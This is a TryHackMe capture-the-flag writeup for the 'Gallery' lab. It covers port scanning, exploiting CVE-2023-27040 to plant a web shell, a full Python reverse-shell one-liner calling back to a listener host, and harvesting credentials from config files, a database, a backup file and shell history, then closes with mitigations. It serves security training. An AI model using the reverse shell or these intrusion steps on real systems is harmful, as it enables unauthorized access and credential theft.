# Gallery — TryHackMe CTF Writeup

- **OS:** Linux
- **Target IP:** `10.65.153.79`

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -A 10.65.153.79
```

**Output:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Simple Image Gallery System
```

Three open ports were found:

- **22** — SSH
- **80** — Apache default page
- **8080** — Simple Image Gallery System (PHP application)

### Vulnerability Research

The scanner also flagged **CVE-2023-29623** on `http://10.65.153.79:8080/classes/Login.php?f=login`, along with several missing security headers and session cookie issues (`PHPSESSID` without `HttpOnly` or `Secure` flags).

Identifying the CMS as **Simple Image Gallery System 1.0** led to the discovery of **CVE-2023-27040**, an unauthenticated Remote Code Execution (RCE) vulnerability with a CVSS score of **9.8 (Critical)**. This flaw allows an attacker to upload and execute arbitrary files on the server without any prior authentication.

---

## Exploitation

### Remote Code Execution — CVE-2023-27040

A public exploit for CVE-2023-27040 was used to upload a PHP web shell to the server. Once the shell was in place, a Python reverse shell was spawned:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.220.227",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
```

A listener on port `4444` caught the incoming connection, providing an interactive shell on the target.

### Database Credential Disclosure

Inspecting `initialize.php` revealed hardcoded developer credentials:

```php
$dev_data = array(
    'id'       => '-1',
    'username' => 'dev_oretnom',
    'password' => '5da283a2d990e8d8512cf967df5bc0d0',
    ...
);
```

Using these details to connect to the local MariaDB instance:

```bash
mysql -h localhost -u gallery_user -p
```

```sql
USE gallery_db;
SELECT * FROM users;
```

```
+----+--------------+----------+----------+----------------------------------+
| id | firstname    | username | password (MD5)                   |
+----+--------------+----------+----------+----------------------------------+
|  1 | Adminstrator | admin    | a228b12a08b6527e7978cbe5d914531c |
+----+--------------+----------+----------+----------------------------------+
```

### Lateral Movement — User `mike`

The `/home` directory contained a user named **mike**. Credentials were found in a backup file at `/var/backups/documents/account.txt`:

```
Spotify    : mike@gmail.com:mycat666
Netflix    : mike@gmail.com:123456789pass
TryHackMe  : mike:darkhacker123
```

None of the above worked for SSH or `su`. However, reviewing `.bash_history` revealed a mistyped `sudo` command where the user accidentally entered their password inline:

```bash
sudo -l b3stpassw0rdbr0xx
```

The string `b3stpassw0rdbr0xx` was therefore identified as mike's system password, confirming a common operational security mistake — credentials inadvertently stored in shell history.

---

## Key Takeaways

The attack chain exploited three weaknesses in sequence. First, the unauthenticated RCE vulnerability (CVE-2023-27040) gave initial access without requiring any credentials at all. Second, hardcoded database credentials in a PHP config file allowed enumeration of internal user accounts. Third, a plaintext password inadvertently typed into the command line and saved in `.bash_history` enabled lateral movement to a privileged user.

Mitigations include: keeping third-party CMS software up to date and patched, never storing credentials in source files, and regularly auditing shell history files — particularly on shared or multi-user systems.

---

## Tools Summary

| Tool | Purpose |
|------|---------|
| Nmap | Port discovery and service/version detection |
| nuclei | Vulnerability scanning and CVE identification |
| Public CVE-2023-27040 exploit | Unauthenticated file upload / RCE |
| MySQL client | Database enumeration |
